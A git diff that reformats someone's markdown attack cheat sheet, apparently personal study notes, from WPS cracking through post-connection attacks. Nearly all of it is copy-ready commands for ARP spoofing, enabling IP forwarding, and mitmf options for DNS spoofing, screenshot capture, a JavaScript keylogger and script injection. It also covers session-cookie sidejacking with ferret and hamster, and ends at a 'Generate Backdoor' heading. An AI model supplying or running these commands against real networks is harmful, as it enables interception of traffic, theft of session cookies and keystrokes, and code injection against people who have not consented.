@@ -147,7 +147,6 @@ Example:
 > reaver -b E0:69:95:8E:18:22 -c 11 -i mon0
 ```
 
-
 ### CASE 2: WPS DISABLED, CAPTURING HANDSHAKE
 
 Handshake packets are sent every time a client associates with the target AP.
@@ -193,17 +192,21 @@ Example:
 
 # POST CONNECTION ATTACKS (TOT HIER OPMAAK)
 
--------NETDISCOVER----------
+### NETDISCOVER
 Discover the connected clients of the current network
-`> netdiscover -i [INTERFACE] -r [RANGE]`
-ex. `> netdiscover -i wlan0 -r 192.168.1.1/24`
+```
+> netdiscover -i [INTERFACE] -r [RANGE]
 
----------AUTOSCAN-----------
+Example: 
 
-program
+> netdiscover -i wlan0 -r 192.168.1.1/24
+```
 
+### AUTOSCAN
 
------------NMAP------------- (using program ZENMAP gui)
+Program installed in Kali Linux.
+
+### NMAP
 
 `>zenmap`
 
@@ -217,7 +220,6 @@ quick scan plus (shows running programs on open ports)
 ```
 
 ## MAN IN THE MIDDLE ATTACKS
-_______________________________________________________
 
 All arp requests/responses are trusted between client and router.
 
@@ -227,44 +229,64 @@ So you tell the client you are the router by telling the client that the device 
 so the client starts sending packets through you. Send ARP response to the router telling you are the client 
 by telling the clients ip address has your MAC address. You are in the middle of the packets.
 
----------- ARP SPOOF -----------
+#### ARP SPOOF 
 tell client you are the router
-`> arpspoof -i [interface] -t [Target IP] [AP ip]`
-ex. `> arspoof -i wlan0 -t 192.168.1.5 192.168.1.1`
+```
+> arpspoof -i [interface] -t [Target IP] [AP ip]
+
+Example:
+
+> arspoof -i wlan0 -t 192.168.1.5 192.168.1.1
+```
 
 tell the router you are the client
-`> arpspoof -i [interface] -t [AP ip] [Target IP]`
-ex. `> arspoof -i wlan0 -t 192.168.1.1 192.168.1.5`
+```
+> arpspoof -i [interface] -t [AP ip] [Target IP]
+
+Example:
+
+> arspoof -i wlan0 -t 192.168.1.1 192.168.1.5
+```
 
 Enable IP forward to allow packets to flow through our device without being dropped.
 `> Echo 1 > /proc/sys/net/ipv4/ip_forward`
 
-### MITMF man in the middle framework
+#### MITMF Man In The Middle Framework
+```
+> mitmf --arp --spoof --gateway [gateway ip] --targets [targets ips] -i eth0
 
-`> mitmf --arp --spoof --gateway [gateway ip] --targets [targets ips] -i eth0`
-Ex. `> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0`
+Example:
 
+> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0
+```
 Enable IP forward to allow packets to flow through our device without being dropped.
 `> Echo 1 > /proc/sys/net/ipv4/ip_forward`
 
------ WHEN CLIENT USES COOKIES TO LOGIN ------
+WHEN CLIENT USES COOKIES TO LOGIN
 
 sniff the cookies instead of sniffing passwords (`apt-get install ferret-sidejack`)
 BEING MAN IN THE MIDDEL IS NEEDED!!!!!
+```
+> mitmf --arp --spoof --gateway [gateway ip] --targets [targets ips] -i eth0
 
-`> mitmf --arp --spoof --gateway [gateway ip] --targets [targets ips] -i eth0`
-Ex. `> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0`
+Example:
 
+> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0
+```
 Capture the cookies
-`> ferret -i [interface]`
-Ex. `> ferret -i eth0`
+```
+> ferret -i [interface]
 
+Example:
+
+ferret -i eth0
+```
 (is a UI, injects the captured cookies into own browser)
 `> hamster`
 (to use this tool: go to settings of browser, advanced, network, connection settings
 and change the port numer to 127.0.0.1 Port 1234 and navigate in browser to 127.0.0.1/1234)
 
-## DNS SPOOFING
+### DNS SPOOFING
 
 start the webserver
 `> service apache2 start`
@@ -275,16 +297,16 @@ Adjust the file with the right ip settings [[[A]]]
 Start spoofing
 `> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0 --dns`
 
------ MITMF Screenshotter ------
+#### MITMF Screenshotter 
 
 `> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0 --screen`
 (screenshots located in /var/log/mitmf directory)
 
------ MITMF KEYLOGGER --------
+#### MITMF KEYLOGGER 
 
 `> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0 --jskeylogger`
 
------ MITMF Code Injection ------
+#### MITMF Code Injection 
 
 `> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 --inject --js-payload "alert('test!');" `
 
@@ -294,7 +316,7 @@ OR
 (you need to make a .js file in the home directory)
 
 
-# NEXPOSE SCANNING
+# NEXPOSE SCANNING TOT HIER OPMAAK
 
 ## Generate Backdoor
 
